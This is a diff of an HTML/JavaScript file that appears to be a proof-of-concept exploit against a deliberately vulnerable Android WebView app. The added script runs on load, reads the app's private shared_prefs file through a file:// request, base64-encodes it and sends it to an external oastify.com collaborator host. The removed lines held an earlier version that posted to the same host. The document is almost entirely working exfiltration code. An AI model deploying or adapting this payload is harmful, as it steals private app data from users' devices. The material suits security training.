@@ -1,22 +1,27 @@
-<!DOCTYPE html>
-<html>    
-    
-<body>
-    Test Webview file exfiltrate: <br>
+<script> 
 
- <button onclick="myFunction()">Try it</button>
+    var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; //local file 
 
-<script>
-function myFunction() {
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState == XMLHttpRequest.DONE) {
-            alert(xhr.getAllResponseHeaders());
-        }
-    }
-    xhr.open("POST","1bdrvfdd4adurpc143pybp20argi48sx.oastify.com",false);
-	xhr.send(request.responseText);
-}
+function load(url) { 
+
+        var xhr = new XMLHttpRequest();
+
+xhr.onreadystatechange = function() { 
+
+            if (xhr.readyState === 4) { 
+
+            fetch('https://1bdrvfdd4adurpc143pybp20argi48sx.oastify.com/?exfiltrated=' + btoa(xhr.responseText));  
+
+            } 
+
+        } 
+
+xhr.open('GET', url, true); 
+
+        xhr.send(''); 
+
+    } 
+
+load(url) 
+
 </script>
-</body>
-</html>
